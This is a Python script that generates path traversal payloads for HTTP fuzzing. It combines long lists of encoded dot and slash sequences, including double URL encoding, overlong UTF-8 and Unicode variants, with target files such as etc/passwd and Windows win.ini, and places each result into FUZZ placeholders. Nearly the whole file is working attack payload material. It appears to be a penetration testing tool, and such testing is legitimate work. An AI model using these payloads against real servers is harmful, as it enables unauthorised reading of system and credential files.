#!/usr/bin/env python3
#! -*- coding: utf-8 -*-

from collections import namedtuple

Payload = namedtuple('PAYLOAD', 'type_ value payload')

WINDOWS_FILES = ['Windows|win.ini', 'Windows|System32|drivers|etc|hosts']
LINUX_FILES = ['etc|passwd', 'etc|issue']
DOTS = [
	'..',
	'.%00.',
	'..%00',
	'..%01',
	'.?', '??', '?.',
	'%5C..',
	'.%2e',
	'%2e.',
	'.../.',
	'..../',
	'%2e%2e',
	'%%c0%6e%c0%6e',
	'0x2e0x2e',
	'%c0.%c0.',
	'%252e%252e',  # double URL encoding: ..
	'%c0%2e%c0%2e',
	'%c0%ae%c0%ae',
	'%c0%5e%c0%5e',
	'%c0%ee%c0%ee',
	'%c0%fe%c0%fe',
	'%uff0e%uff0e',
	'%%32%%65%%32%%65',
	'%e0%80%ae%e0%80%ae',
	'%25c0%25ae%25c0%25ae',
	'%f0%80%80%ae%f0%80%80%ae',
	'%f8%80%80%80%ae%f8%80%80%80%ae',
	'%fc%80%80%80%80%ae%fc%80%80%80%80%ae']
SLASHES = [
	'/', '\\',
	'%2f', '%5c',
	'0x2f', '0x5c',
	'%252f',
	'%255c',  # double URL encoding: \
	'%c0%2f', '%c0%af', '%c0%5c', '%c1%9c', '%c1%pc',
	'%c0%9v', '%c0%qf', '%c1%8s', '%c1%1c', '%c1%af',
	'%bg%qf', '%u2215', '%u2216', '%uEFC8', '%uF025',
	'%%32%%66', '%%35%%63',
	'%e0%80%af',
	'%25c1%259c', '%25c0%25af',
	'%f0%80%80%af',
	'%f8%80%80%80%af']

class Generator:

	def __init__(self, type_, inputs, depth, os):
		self.type_ = type_
		self.inputs = inputs
		self.depth = depth
		self.slashes = SLASHES
		self.dots = DOTS
		if os == 'windows':
			self.files = WINDOWS_FILES
		elif os == 'posix' or os == 'linux':
			self.files = LINUX_FILES
		else:
			raise TypeError

		if self.type_ == 'http':
			self.get_payloads = self.get_payloads_http

	# def get_payloads(self):
	# 	if self.type_ == 'http':
	# 		yield self.get_payloads_http()

	def get_payloads_http(self):
		for type_, inp_list in self.inputs.items():
			for file in self.files:
				for dot in self.dots:
					for slash in self.slashes:
						for i in range(1, self.depth + 1):
							for input_ in inp_list:
								payload = (dot + slash) * i + file.replace('|', slash)
								fuzzed = input_.replace('FUZZ', payload)
								yield Payload(type_, fuzzed, payload)